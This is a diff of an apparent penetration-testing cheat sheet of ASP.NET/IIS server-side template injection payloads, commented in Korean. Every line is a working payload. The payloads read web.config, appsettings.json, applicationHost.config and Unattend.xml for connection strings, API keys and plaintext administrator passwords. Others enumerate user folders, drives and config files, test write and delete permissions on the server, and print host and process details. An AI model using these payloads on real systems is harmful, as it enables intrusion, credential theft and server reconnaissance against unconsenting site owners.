@@ -1,20 +1,55 @@
-<%= System.IO.Directory.GetFiles(Server.MapPath("~")).Length %>
-' 웹 루트 디렉터리의 파일 개수를 출력하여 디렉터리 읽기 권한 확인
-​<%= string.Join(", ", System.IO.Directory.GetFiles(Server.MapPath("~"))) %>
-' 웹 루트 디렉터리에 존재하는 모든 파일 목록을 출력
-​<%= string.Join(", ", System.IO.Directory.GetDirectories(Server.MapPath("~"))) %>
-' 웹 루트 디렉터리 하위의 모든 폴더 목록을 출력
+<%= System.IO.File.ReadAllText(Server.MapPath("~/web.config")) %>
+' web.config 전체 내용을 읽어와 DB 연결 문자열 및 주요 설정 정보 확인
+​<%= System.IO.File.Exists(Server.MapPath("/appsettings.json")) ? System.IO.File.ReadAllText(Server.MapPath("/appsettings.json")) : "No JSON" %>
+' appsettings.json 파일이 존재하는 경우 읽어와 API 키 및 DB 정보 확인
+​<%= string.Join("
+", System.IO.Directory.GetFiles(Server.MapPath("~"), "*.config", System.IO.SearchOption.AllDirectories)) %>
+' 웹 루트 하위 모든 폴더에서 .config 확장자 파일 경로 검색
+​<%= string.Join("
+", System.IO.Directory.GetFiles(Server.MapPath("~"), "*.json", System.IO.SearchOption.AllDirectories)) %>
+' 웹 루트 하위 모든 폴더에서 .json 확장자 파일 경로 검색
 ​<%= string.Join(", ", System.IO.Directory.GetLogicalDrives()) %>
-' 서버에 존재하는 모든 드라이브 문자(C:, D:\ 등) 목록 출력
-​<%= System.IO.File.ReadAllText(Server.MapPath("~/web.config")) %>
-' web.config 파일 전체 내용을 읽어와 DB 연결 문자열 및 주요 설정 정보 확인
-​<%= System.IO.Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)).FullName %>
-' 사용자 프로필 디렉터리 상위 경로를 조회하여 시스템 사용자 계정 목록 확인
+' 서버에 존재하는 모든 논리 드라이브(C:, D:\ 등) 목록 출력
+​<%= string.Join("
+", System.IO.Directory.GetDirectories(@"C:\Users")) %>
+' C:\Users 폴더를 탐색하여 서버에 존재하는 사용자 계정 폴더 목록 확인
+​<%= string.Join("
+", System.IO.Directory.GetFiles(Server.MapPath("~"))) %>
+' 현재 웹 애플리케이션 루트 디렉터리의 모든 파일 목록 출력
+​<%= string.Join("
+", System.IO.Directory.GetDirectories(Server.MapPath("~"))) %>
+' 현재 웹 애플리케이션 루트 디렉터리의 모든 하위 폴더 목록 출력
+​<%= string.Join("
+", System.IO.Directory.GetFiles(@"C:\inetpub\wwwroot")) %>
+' IIS 기본 웹 루트 디렉터리(wwwroot)의 파일 목록 출력
+​<%= string.Join("
+", System.IO.Directory.GetDirectories(@"C:\inetpub\history")) %>
+' IIS 구성 변경 이력(History) 폴더를 탐색하여 이전 web.config 백업 유무 확인
 ​<%= System.IO.File.ReadAllText(@"C:\Windows\System32\drivers\etc\hosts") %>
 ' Windows hosts 파일 내용을 읽어 내부 네트워크 도메인 매핑 정보 확인
-​<%= System.IO.File.Exists(@"C:\Windows\System32\cmd.exe") ? "cmd_exists" : "cmd_not_found" %>
-' cmd.exe 바이너리 존재 여부를 확인하여 파일 접근 제약 유무 검증
-​<%= string.Join(", ", System.IO.Directory.GetFiles(@"C:\Windows\Temp")) %>
-' C:\Windows\Temp 디렉터리의 파일 목록을 읽어 임시 파일 폴더 접근 권한 확인
-​<%= new Action(() => { System.IO.File.WriteAllText(Server.MapPath("test.txt"), "ok"); }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("test.txt")) %>
-' 웹 디렉터리에 test.txt 임시 파일을 생성 후 읽어와 디렉터리 쓰기 권한 테스트
+​<%= string.Join("
+", System.IO.Directory.GetFiles(@"C:\Windows\System32\inetsrv\config")) %>
+' IIS 전역 설정 파일이 위치한 inetsrv\config 디렉터리 접근 권한 확인
+​<%= System.IO.File.Exists(@"C:\Windows\System32\inetsrv\config\applicationHost.config") ? System.IO.File.ReadAllText(@"C:\Windows\System32\inetsrv\config\applicationHost.config") : "Access Denied / Not Found" %>
+' IIS 전역 구성 파일(applicationHost.config)을 읽어 전체 웹사이트 및 AppPool 설정 추출
+​<%= string.Join("
+", System.IO.Directory.GetFiles(@"C:\Windows\Panther")) %>
+' Windows 설치/업그레이드 로그(Panther) 디렉터리의 파일 목록 확인
+​<%= System.IO.File.Exists(@"C:\Windows\Panther\Unattend.xml") ? System.IO.File.ReadAllText(@"C:\Windows\Panther\Unattend.xml") : "Unattend.xml Not Found" %>
+' Windows 무인 설치 파일(Unattend.xml) 내 관리자 계정/비밀번호 평문 흔적 확인
+​<%= new Action(() => { System.IO.File.WriteAllText(Server.MapPath("test_check.txt"), "test_ok"); }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("test_check.txt")) %>
+' 현재 웹 디렉터리에 임시 파일 작성 후 다시 읽어와 쓰기 권한 유무 검증
+​<%= new Action(() => { System.IO.File.Delete(Server.MapPath("test_check.txt")); }) == null ? "Deleted" : "Delete Failed" %>
+' 테스트용 임시 파일을 삭제하여 파일 삭제 권한 유무 검증
+​<%= new Action(() => { System.IO.File.WriteAllText(@"C:\Windows\Temp\temp_check.txt", "temp_ok"); }) == null ? "" : System.IO.File.ReadAllText(@"C:\Windows\Temp\temp_check.txt") %>
+' C:\Windows\Temp 공용 디렉터리에 파일 쓰기 및 읽기 권한 검증
+​<%= System.Environment.CommandLine %>
+' 현재 IIS Worker Process(w3wp.exe) 실행 시 전달된 명령줄 인자 확인
+​<%= System.Environment.MachineName %>
+' 서버의 실제 호스트명(Computer Name) 출력
+​<%= System.Environment.OSVersion.ToString() %>
+' 서버의 커널 및 Windows OS 버전 정보 출력
+​<%= System.AppDomain.CurrentDomain.FriendlyName %>
+' 현재 실행 중인 IIS Application Pool(AppDomain) 식별자 이름 출력
+​<%= System.Web.Hosting.HostingEnvironment.ApplicationPhysicalPath %>
+' 현재 웹 애플리케이션이 위치한 디스크 상의 절대 물리 경로 출력
